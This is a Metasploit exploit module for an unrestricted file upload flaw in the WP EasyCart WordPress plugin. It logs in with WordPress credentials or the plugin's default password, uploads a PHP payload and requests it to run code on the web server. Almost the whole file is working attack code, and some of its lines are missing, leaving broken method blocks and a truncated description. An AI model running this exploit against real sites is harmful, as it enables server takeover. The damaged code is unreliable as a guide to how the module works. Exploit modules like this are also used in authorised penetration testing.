# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;WordPress WP EasyCart Unrestricted File Upload&#039;,
      &#039;Description&#039;     => %q{WordPress Shopping Cart (WP EasyCart) Plugin for
                              WordPress contains a flaw that allows a remote
                              attacker to execute arbitrary PHP code. This
                              flaw exists because the
                              /inc/amfphp/administration/banneruploaderscript.php
                              script does not properly verify or sanitize
                              user-uploaded files. By uploading a .php file,
                              the remote system will place the file in a
                              user-accessible path. Making a direct request to
                              the uploaded file will allow the attacker to
                              execute the script with the privileges of the web
                              server.

                              In versions <= 3.0.8 authentication can be done by
                              using the WordPress credentials of a user with any
                              role. In later versions, a valid EasyCart admin
                              password will be required that is in use by any
                              admin user. A default installation of EasyCart will
                              of "demouser".},
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Kacper Szurek&#039;,                  # Vulnerability disclosure
          &#039;Rob Carr <rob[at]rastating.com>&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;OSVDB&#039;, &#039;116806&#039;],
          [&#039;WPVDB&#039;, &#039;7745&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Jan 08 2015&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;wp-easycart&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [false, &#039;The WordPress username to authenticate with (versions <= 3.0.8)&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, &#039;The WordPress password to authenticate with (versions <= 3.0.8)&#039;]),
        OptString.new(&#039;EC_PASSWORD&#039;, [false, &#039;The EasyCart password to authenticate with (versions <= 3.0.18)&#039;, &#039;demouser&#039;]),
        OptBool.new(&#039;EC_PASSWORD_IS_HASH&#039;, [false, &#039;Indicates whether or not EC_PASSWORD is an MD5 hash&#039;, false])
      ], self.class)
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def ec_password
    datastore[&#039;EC_PASSWORD&#039;]
  end

  def ec_password_is_hash
    datastore[&#039;EC_PASSWORD_IS_HASH&#039;]
  end

    username.to_s != &#039;&#039; && password.to_s != &#039;&#039;
  end

  def use_ec_authentication
    ec_password.to_s != &#039;&#039;
  end

  def req_id
    if ec_password_is_hash
      return ec_password
    else
      return Rex::Text.md5(ec_password)
    end
  end

  def generate_mime_message(payload, date_hash, name, include_req_id)
    data = Rex::MIME::Message.new
    data.add_part(date_hash, nil, nil, &#039;form-data; name="datemd5"&#039;)
    data.add_part(payload.encoded, &#039;application/x-php&#039;, nil, "form-data; name=\"Filedata\"; filename=\"#{name}\"")
    data.add_part(req_id, nil, nil, &#039;form-data; name="reqID"&#039;) if include_req_id
    data
  end

  def setup
      fail_with(Failure::BadConfig, &#039;You must set either the USERNAME and PASSWORD options or specify an EC_PASSWORD value&#039;)
    end

    super
  end

  def exploit
    vprint_status("#{peer} - EC authentication attack is enabled") if use_ec_authentication

      print_status("#{peer} - Both EasyCart and WordPress credentials were supplied, attempting WordPress first...")
    end

      print_status("#{peer} - Authenticating using #{username}:#{password}...")

      if !cookie
        if use_ec_authentication
          print_warning("#{peer} - Failed to authenticate with WordPress, attempting upload with EC password next...")
        else
          fail_with(Failure::NoAccess, &#039;Failed to authenticate with WordPress&#039;)
        end
      else
        print_good("#{peer} - Authenticated with WordPress")
      end
    end

    print_status("#{peer} - Preparing payload...")
    payload_name = Rex::Text.rand_text_alpha(10)
    date_hash = Rex::Text.md5(Time.now.to_s)
    uploaded_filename = "#{payload_name}_#{date_hash}.php"
    uploader_url = normalize_uri(plugin_url, &#039;inc&#039;, &#039;amfphp&#039;, &#039;administration&#039;, &#039;banneruploaderscript.php&#039;)
    payload_url = normalize_uri(plugin_url, &#039;products&#039;, &#039;banners&#039;, uploaded_filename)
    data = generate_mime_message(payload, date_hash, "#{payload_name}.php", use_ec_authentication)

    print_status("#{peer} - Uploading payload to #{payload_url}")
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => uploader_url,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => data.to_s,
      &#039;cookie&#039;  => cookie
    )

    fail_with(Failure::Unreachable, &#039;No response from the target&#039;) if res.nil?
    vprint_error("#{peer} - Server responded with status code #{res.code}") if res.code != 200

    print_status("#{peer} - Executing the payload...")
    register_files_for_cleanup(uploaded_filename)
    res = send_request_cgi(
    {
      &#039;uri&#039;     => payload_url,
      &#039;method&#039;  => &#039;GET&#039;
    }, 5)

    if !res.nil? && res.code == 404
      print_error("#{peer} - Failed to upload the payload")
    else
      print_good("#{peer} - Executed payload")
    end
  end
end

